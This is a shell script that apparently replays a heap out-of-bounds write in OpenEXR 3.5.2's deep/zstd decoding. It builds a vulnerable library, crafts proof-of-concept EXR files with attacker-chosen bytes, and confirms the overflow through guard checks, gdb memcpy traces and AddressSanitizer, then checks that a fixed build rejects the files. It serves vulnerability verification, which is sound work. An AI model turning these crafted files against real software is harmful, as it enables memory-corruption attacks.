#!/bin/sh
# W184: one-command replay of a fully file-chosen second-stage OOB copy.
# U=4N makes the FLOAT row fit the 4N-byte destination; the HALF row then
# writes 2N file-chosen bytes at dst+4N, entirely past the allocation.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p work-mixed evidence

if [ ! -x bin-vuln-plain/gen_baseline_deep_mixed ]; then
    BUILD=build-vuln-plain
    SRC=src/openexr-3.5.2
    CORE="$BUILD/src/lib/OpenEXRCore"
    GEN="$BUILD/cmake"
    IMATH_COMPAT="$BUILD/OpenEXR_ImathIncludeCompat"
    IMATH_CONFIG="$BUILD/_deps/imath-build/config"
    IMATH_SRC="$BUILD/_deps/imath-src/src"
    OPENEXR_SRC="$SRC/src/lib"
    LIBS="$BUILD/src/lib/OpenEXRUtil/libOpenEXRUtil*.a $BUILD/src/lib/OpenEXR/libOpenEXR-3_5*.a $BUILD/src/lib/OpenEXRCore/libOpenEXRCore*.a $BUILD/src/lib/IlmThread/libIlmThread*.a $BUILD/src/lib/Iex/libIex*.a"
    IMATH_LIB=$(find "$BUILD/_deps" -name 'libImath*.a' | sort | tr '\n' ' ')
    INC="-I$CORE -I$SRC/src/lib/OpenEXRCore -I$GEN -I$IMATH_COMPAT -I$IMATH_CONFIG -I$IMATH_SRC -I$OPENEXR_SRC/OpenEXR -I$OPENEXR_SRC/Iex -I$OPENEXR_SRC/IlmThread"
    g++ -g -O1 $INC cases/gen_baseline_deep_mixed.cpp $LIBS $IMATH_LIB \
        -ldeflate -lzstd -lz -lpthread -lm \
        -o bin-vuln-plain/gen_baseline_deep_mixed
fi

BASE=work-mixed/baseline_deep_mixed.exr
P3C=work-mixed/poc_mixed_full_3c.exr
P5A=work-mixed/poc_mixed_full_5a.exr

bin-vuln-plain/gen_baseline_deep_mixed "$BASE" > evidence/full-oob-gen.out
python3 cases/make_poc_mixed_full.py "$BASE" "$P3C" 64 0x3c 256 \
    >> evidence/full-oob-gen.out
python3 cases/make_poc_mixed_full.py "$BASE" "$P5A" 64 0x5a 256 \
    >> evidence/full-oob-gen.out
test "$(sha256sum "$BASE" | cut -d' ' -f1)" = \
    9aa2073dce40b893f648f0fb078b738538e65a569cb00079d4128612e7fa3d04
test "$(sha256sum "$P3C" | cut -d' ' -f1)" = \
    1fafb97255ad2178d8d68a1dec703f89b08aba2ac5f647658f3cd9187e6c8ba0
test "$(sha256sum "$P5A" | cut -d' ' -f1)" = \
    2ab3ea9751736720030d606cd3dd947dd000039da537a47bf822f1f18dd618f7

norm() { awk '/^BUFFERS / {gsub(/0x[0-9a-f]+/, "ADDR")} {print}'; }
bin-vuln-plain/guarded_harness "$BASE" 2>&1 | norm \
    > evidence/full-oob-baseline.out
bin-vuln-plain/guarded_harness "$P3C" 2>&1 | norm \
    > evidence/full-oob-plain-3c.out
bin-vuln-plain/guarded_harness "$P5A" 2>&1 | norm \
    > evidence/full-oob-plain-5a.out
bin-fixed-asan/guarded_harness "$P3C" 2>&1 | norm \
    > evidence/full-oob-fixed.out

grep -q 'DECODE rv=0' evidence/full-oob-baseline.out
grep -q 'GUARD-TOTAL post-decode changed=0' evidence/full-oob-baseline.out
grep -q 'DECODE rv=31' evidence/full-oob-plain-3c.out
grep -q 'GUARD-CHANGE alloc=24 size=256 changed=128 first=+0 expected=0x7c actual@first=0x3c' \
    evidence/full-oob-plain-3c.out
grep -q 'GUARD-TOTAL post-decode changed=128' evidence/full-oob-plain-3c.out
grep -q 'GUARD-CHANGE alloc=24 size=256 changed=128 first=+0 expected=0x7c actual@first=0x5a' \
    evidence/full-oob-plain-5a.out
grep -q 'GUARD-TOTAL post-decode changed=128' evidence/full-oob-plain-5a.out
grep -q 'DECODE rv=23' evidence/full-oob-fixed.out
grep -q 'GUARD-TOTAL post-decode changed=0' evidence/full-oob-fixed.out

SINKRAW=$(mktemp)
gdb -q -batch -ex 'set pagination off' \
    -ex 'break sort2_4ByteChannels_tiled' \
    -ex "run $P3C" \
    -ex 'set $base=(long)outPtr' -ex 'set $src=(long)inPtr' -ex 'delete 1' \
    -ex 'break memcpy if $rdx == 256 || $rdx == 128' \
    -ex 'continue' -ex 'printf "SINKCOPY dst_off=%ld src_off=%ld n=%ld\n", (long)$rdi-$base, (long)$rsi-$src, $rdx' \
    -ex 'continue' -ex 'continue' \
    -ex 'printf "SINKCOPY dst_off=%ld src_off=%ld n=%ld\n", (long)$rdi-$base, (long)$rsi-$src, $rdx' \
    bin-vuln-plain/guarded_harness > "$SINKRAW" 2>&1
grep '^SINKCOPY' "$SINKRAW" > evidence/full-oob-gdb-copies.out
rm -f "$SINKRAW"
grep -q '^SINKCOPY dst_off=0 src_off=128 n=256$' evidence/full-oob-gdb-copies.out
grep -q '^SINKCOPY dst_off=256 src_off=0 n=128$' evidence/full-oob-gdb-copies.out

RAW=$(mktemp)
trap 'rm -f "$RAW"' EXIT
for pair in '3c:poc_mixed_full_3c.exr' '5a:poc_mixed_full_5a.exr'; do
    byte=${pair%%:*}
    file=${pair#*:}
    gdb -q -batch -ex 'set pagination off' -ex 'break guarded_harness.c:137' \
        -ex "run work-mixed/$file" \
        -ex 'x/128bx decode.unpacked_buffer+256' \
        bin-vuln-plain/guarded_harness > "$RAW" 2>&1
    grep '^0x' "$RAW" | cut -d: -f2- > "evidence/full-oob-gdb-$byte.out"
    test "$(grep -o "0x$byte" "evidence/full-oob-gdb-$byte.out" | wc -l)" -eq 128
done
bin-vuln-asan/flat_harness "$P3C" > /tmp/w184-asan-raw.$$ 2>&1 || true
grep -E 'ERROR: AddressSanitizer|READ of size 256|internal_zstd.c:472|0 bytes after' \
    /tmp/w184-asan-raw.$$ | awk '{gsub(/0x[0-9a-f]+/, "ADDR"); gsub(/==[0-9]+==/, "==PID=="); print}' \
    > evidence/full-oob-flat-asan.out
rm -f /tmp/w184-asan-raw.$$
grep -q 'READ of size 256' evidence/full-oob-flat-asan.out
grep -q 'internal_zstd.c:472' evidence/full-oob-flat-asan.out

printf 'RESULT PASS\n'
sha256sum evidence/full-oob-*.out
